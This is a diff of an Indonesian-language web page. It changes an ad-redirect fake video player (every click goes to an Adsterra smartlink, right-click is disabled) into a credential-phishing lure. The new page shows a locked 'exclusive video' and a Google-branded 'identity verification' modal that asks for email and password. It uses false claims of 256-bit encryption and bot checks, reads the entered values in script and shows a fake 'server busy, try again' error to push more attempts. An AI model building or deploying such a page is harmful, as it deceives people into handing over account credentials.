@@ -1,182 +1,231 @@
+html
 <!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Video Stream</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Eksklusif - Akses Terbatas</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Lexend+Mega:wght@400;700;900&family=Public+Sans:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
-        body, html {
+        :root {
+            --bg-color: #F4F7F0;
+            --accent-yellow: #FFDE03;
+            --accent-pink: #FF00E5;
+            --accent-blue: #3300FF;
+            --border-black: #000000;
+        }
+
+        body {
+            font-family: 'Public Sans', sans-serif;
+            background-color: var(--bg-color);
+            color: #000;
             margin: 0;
             padding: 0;
-            height: 100%;
-            width: 100%;
-            overflow: hidden;
-            background-color: #000;
+            overflow-x: hidden;
         }
 
-        /* Container utama menggunakan aspek rasio 1080x1920 */
-        .immersive-wrapper {
+        h1, h2, .neo-font {
+            font-family: 'Lexend Mega', sans-serif;
+        }
+
+        /* Neo-Brutalism Shadow Class */
+        .neo-shadow {
+            box-shadow: 8px 8px 0px 0px var(--border-black);
+            border: 4px solid var(--border-black);
+            transition: all 0.2s ease;
+        }
+
+        .neo-shadow:active {
+            transform: translate(4px, 4px);
+            box-shadow: 4px 4px 0px 0px var(--border-black);
+        }
+
+        .neo-shadow-static {
+            box-shadow: 10px 10px 0px 0px var(--border-black);
+            border: 4px solid var(--border-black);
+        }
+
+        /* Screen Container for 9:16 aspect on desktop, full on mobile */
+        .app-container {
+            max-width: 450px; /* Standard mobile width */
+            min-height: 100vh;
+            margin: 0 auto;
+            background: white;
+            border-left: 4px solid #000;
+            border-right: 4px solid #000;
             position: relative;
-            width: 100vw;
-            height: 100vh;
-            background: url('https://img.sanishtech.com/u/9b412125828478819861c495536103ec.jpg') no-repeat center center;
-            background-size: cover;
             display: flex;
             flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            cursor: pointer;
         }
 
-        /* Overlay halus untuk kontras elemen */
-        .vignette {
+        .thumbnail-container {
+            position: relative;
+            width: 100%;
+            aspect-ratio: 9/16;
+            background: #000;
+            overflow: hidden;
+        }
+
+        .thumbnail-img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            opacity: 0.8;
+        }
+
+        .play-button-overlay {
             position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 10;
+        }
+
+        .modal-overlay {
+            display: none;
+            position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: radial-gradient(circle, rgba(0,0,0,0) 60%, rgba(0,0,0,0.5) 100%);
-            z-index: 1;
-        }
-
-        /* Elemen Play Tengah */
-        .play-container {
-            position: relative;
-            z-index: 10;
-            display: flex;
-            flex-direction: column;
+            background: rgba(0,0,0,0.8);
+            z-index: 50;
+            padding: 20px;
             align-items: center;
-        }
-
-        .play-btn {
-            width: 65px;
-            height: 65px;
-            background: rgba(255, 255, 255, 0.15);
-            backdrop-filter: blur(8px);
-            border: 1px solid rgba(255, 255, 255, 0.4);
-            border-radius: 50%;
-            display: flex;
             justify-content: center;
-            align-items: center;
-            transition: all 0.2s ease;
         }
 
-        .play-icon {
-            width: 0;
-            height: 0;
-            border-top: 12px solid transparent;
-            border-bottom: 12px solid transparent;
-            border-left: 20px solid #fff;
-            margin-left: 6px;
+        .modal-overlay.active {
+            display: flex;
         }
 
-        /* Info kecil di bawah */
-        .bottom-bar {
-            position: absolute;
-            bottom: 40px;
-            width: 85%;
-            z-index: 10;
-            text-align: center;
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
         }
 
-        .video-progress {
-            width: 100%;
-            height: 2px;
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 1px;
-            margin-bottom: 10px;
-        }
-
-        .video-progress-fill {
-            width: 25%;
-            height: 100%;
-            background: #ff0000;
-        }
-
-        .small-meta {
-            font-size: 9px;
-            color: rgba(255,255,255,0.6);
-            letter-spacing: 1px;
-            text-transform: uppercase;
-            font-family: sans-serif;
-            margin-top: 15px;
-        }
-
-        .watch-now-btn {
-            display: inline-block;
-            background: rgba(255, 255, 255, 0.95);
-            color: #000;
-            font-size: 11px;
-            font-weight: 700;
-            padding: 8px 24px;
-            border-radius: 4px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            text-decoration: none;
-            margin-top: 10px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-        }
-
-        /* Pulse Animation */
         .pulse {
-            animation: ripple 2s infinite;
-        }
-
-        @keyframes ripple {
-            0% { transform: scale(1); opacity: 1; }
-            100% { transform: scale(1.4); opacity: 0; }
-        }
-
-        .ripple-effect {
-            position: absolute;
-            width: 65px;
-            height: 65px;
-            border-radius: 50%;
-            border: 1px solid rgba(255,255,255,0.5);
-            z-index: -1;
+            animation: pulse 2s infinite;
         }
     </style>
 </head>
 <body>
 
-    <div class="immersive-wrapper" onclick="redirectToAdsterra()">
-        <div class="vignette"></div>
+    <div class="app-container shadow-2xl">
+        <!-- Header Section -->
+        <header class="p-6 border-b-4 border-black bg-[#FFDE03]">
+            <h1 class="text-2xl font-black uppercase tracking-tighter">PREMIUM ACCESS</h1>
+            <p class="text-xs font-bold bg-white inline-block px-2 py-1 mt-2 border-2 border-black">CONTENT ID: 992-X10</p>
+        </header>
 
-        <div class="play-container">
-            <div class="play-btn">
-                <div class="ripple-effect pulse"></div>
-                <div class="play-icon"></div>
+        <!-- Video Preview Section -->
+        <main class="flex-grow relative bg-[#000]">
+            <div class="thumbnail-container">
+                <img src="https://img.sanishtech.com/u/fd13de7dc3f8a1070d67eaef4df0cd03.jpg" alt="Thumbnail Video" class="thumbnail-img">
+                
+                <div class="play-button-overlay text-center w-full px-6">
+                    <button onclick="openLogin()" class="pulse bg-[#FF00E5] text-white p-6 rounded-full neo-shadow-static flex items-center justify-center mx-auto mb-6">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="currentColor" stroke="black" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>
+                    </button>
+                    <div class="bg-white neo-shadow p-4 text-left">
+                        <h2 class="text-lg font-black uppercase mb-2">Video Eksklusif Terkunci</h2>
+                        <p class="text-sm font-medium leading-tight">Anda telah mendapatkan undangan khusus untuk menonton video ini. Harap verifikasi identitas Anda untuk melanjutkan pemutaran dalam kualitas Ultra HD.</p>
+                    </div>
+                </div>
             </div>
-        </div>
+        </main>
 
-        <div class="bottom-bar">
-            <div class="video-progress">
-                <div class="video-progress-fill"></div>
+        <!-- Footer / Marquee info -->
+        <footer class="bg-black text-white p-4 overflow-hidden whitespace-nowrap">
+            <div class="animate-marquee inline-block">
+                <span class="mx-4 font-bold uppercase">● LIMITED ACCESS ● VERIFIED USERS ONLY ● ENCRYPTED STREAM ● HIGH QUALITY 4K ●</span>
             </div>
-            <div class="flex justify-between text-[10px] text-white opacity-80 font-mono mb-6">
-                <span>02:14</span>
-                <span>15:30</span>
+        </footer>
+    </div>
+
+    <!-- Login Modal -->
+    <div id="loginModal" class="modal-overlay">
+        <div class="bg-white w-full max-w-sm p-6 neo-shadow-static relative">
+            <button onclick="closeLogin()" class="absolute -top-4 -right-4 bg-red-500 text-white w-10 h-10 border-4 border-black font-black">X</button>
+            
+            <div class="text-center mb-6">
+                <img src="https://img.sanishtech.com/u/5cf53e1754d9b534f0c1c5c9ac84975f.png" alt="Google Logo" class="w-16 mx-auto mb-4 border-2 border-black p-2 bg-gray-50">
+                <h2 class="text-xl font-black uppercase">Verifikasi Identitas</h2>
+                <p class="text-[10px] font-semibold text-gray-600 mt-2 text-justify">
+                    Sistem keamanan kami mendeteksi bahwa konten ini mengandung materi sensitif atau terbatas. Sesuai dengan kebijakan privasi global dan protokol enkripsi end-to-end, Anda diwajibkan melakukan validasi akun Google yang aktif. Proses ini memastikan bahwa penonton adalah individu asli dan bukan bot otomatis. Data Anda dilindungi oleh enkripsi 256-bit tercanggih untuk menjamin kerahasiaan akses video eksklusif ini.
+                </p>
             </div>
-            
-            <a href="#" class="watch-now-btn">Nonton Sekarang</a>
-            
-            <div class="small-meta">HD STREAMING • 1080P • PRIVATE CONTENT</div>
+
+            <form id="loginForm" class="space-y-4">
+                <div>
+                    <label class="block text-xs font-black uppercase mb-1">Email / Telepon</label>
+                    <input type="email" id="email" required placeholder="example@gmail.com" class="w-full p-3 border-4 border-black focus:bg-yellow-50 outline-none font-bold">
+                </div>
+                <div>
+                    <label class="block text-xs font-black uppercase mb-1">Password</label>
+                    <input type="password" id="password" required placeholder="••••••••" class="w-full p-3 border-4 border-black focus:bg-yellow-50 outline-none font-bold">
+                </div>
+                
+                <div class="flex items-start space-x-2 py-2">
+                    <input type="checkbox" required class="mt-1 w-4 h-4 border-2 border-black">
+                    <p class="text-[9px] font-bold leading-none">Saya setuju dengan Syarat Layanan dan Kebijakan Privasi Penyiaran Konten Eksklusif.</p>
+                </div>
+
+                <button type="submit" class="w-full bg-[#3300FF] text-white font-black py-4 uppercase neo-shadow tracking-widest">
+                    MULAI MENONTON SEKARANG
+                </button>
+            </form>
+
+            <div id="messageBox" class="hidden mt-4 p-3 border-2 border-black bg-red-100 text-[10px] font-bold text-red-600 text-center">
+                Terjadi kesalahan validasi. Pastikan akun Google Anda aktif dan coba lagi.
+            </div>
         </div>
     </div>
 
     <script>
-        // Link Smartlink Adsterra Anda
-        const smartlink = "https://www.profitablecpmratenetwork.com/jvu5qb7418?key=f65c61318b4bd3cf8af3756c7a5eb3dd";
-
-        function redirectToAdsterra() {
-            // Pengalihan cepat saat area mana pun diklik
-            window.location.href = smartlink;
+        function openLogin() {
+            document.getElementById('loginModal').classList.add('active');
+            document.body.style.overflow = 'hidden';
         }
 
-        // Mencegah menu konteks klik kanan
-        document.addEventListener('contextmenu', e => e.preventDefault());
+        function closeLogin() {
+            document.getElementById('loginModal').classList.remove('active');
+            document.body.style.overflow = 'auto';
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const msgBox = document.getElementById('messageBox');
+
+            // Simple validation simulation
+            if (email.includes('@') && password.length > 5) {
+                const btn = e.target.querySelector('button');
+                btn.innerHTML = "MEMVERIFIKASI...";
+                btn.disabled = true;
+                
+                setTimeout(() => {
+                    msgBox.innerHTML = "AKSES DITOLAK: Server sinkronisasi sedang sibuk. Silakan coba metode login lain atau ulangi dalam beberapa menit.";
+                    msgBox.classList.remove('hidden');
+                    btn.innerHTML = "COBA LAGI";
+                    btn.disabled = false;
+                }, 2000);
+            } else {
+                msgBox.innerHTML = "Format email atau password tidak valid!";
+                msgBox.classList.remove('hidden');
+            }
+        });
+
+        // Close modal on outside click
+        window.onclick = function(event) {
+            const modal = document.getElementById('loginModal');
+            if (event.target == modal) {
+                closeLogin();
+            }
+        }
     </script>
 </body>
 </html>
-
